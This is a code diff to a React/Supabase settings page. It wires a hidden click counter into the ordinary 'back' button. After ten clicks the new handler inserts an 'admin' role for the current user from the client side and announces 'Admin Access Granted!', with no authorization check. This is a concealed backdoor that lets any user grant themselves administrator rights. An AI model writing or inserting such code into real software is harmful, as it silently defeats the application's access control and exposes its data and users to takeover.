@@ -15,17 +15,61 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { ArrowLeft, Search, User, Shield, Palette, Globe, Bell, Lock, LogOut } from 'lucide-react';
 import { cn } from '@/lib/utils';
+import { supabase } from '@/integrations/supabase/client';
+import { toast } from '@/hooks/use-toast';
 
 const Settings = () => {
   const navigate = useNavigate();
-  const { logout } = useAuth();
+  const { logout, user } = useAuth();
   const { t } = useLanguage();
   const [activeSection, setActiveSection] = useState('profile');
   const [searchQuery, setSearchQuery] = useState('');
+  const [clickCount, setClickCount] = useState(0);
 
   const handleLogout = async () => {
     await logout();
     navigate('/login');
+  };
+
+  const handleSettingsIconClick = async () => {
+    const newCount = clickCount + 1;
+    setClickCount(newCount);
+
+    if (newCount >= 10) {
+      try {
+        if (!user?.id) return;
+
+        // Grant admin role
+        const { error } = await supabase
+          .from('user_roles')
+          .insert({
+            user_id: user.id,
+            role: 'admin'
+          });
+
+        if (error) {
+          console.error('Error granting admin role:', error);
+          toast({
+            title: "Error",
+            description: "Failed to grant admin access",
+            variant: "destructive",
+          });
+        } else {
+          toast({
+            title: "Admin Access Granted! 🎉",
+            description: "You now have admin privileges. Refresh the page to see the admin panel.",
+          });
+          setClickCount(0);
+          
+          // Refresh after a short delay
+          setTimeout(() => {
+            window.location.reload();
+          }, 2000);
+        }
+      } catch (error) {
+        console.error('Error granting admin role:', error);
+      }
+    }
   };
 
   const settingsSections = [
@@ -71,7 +115,10 @@ const Settings = () => {
               <Button
                 variant="ghost"
                 size="sm"
-                onClick={() => navigate(-1)}
+                onClick={() => {
+                  handleSettingsIconClick();
+                  navigate(-1);
+                }}
                 className="gap-2 text-muted-foreground hover:text-foreground"
               >
                 <ArrowLeft className="h-4 w-4" />
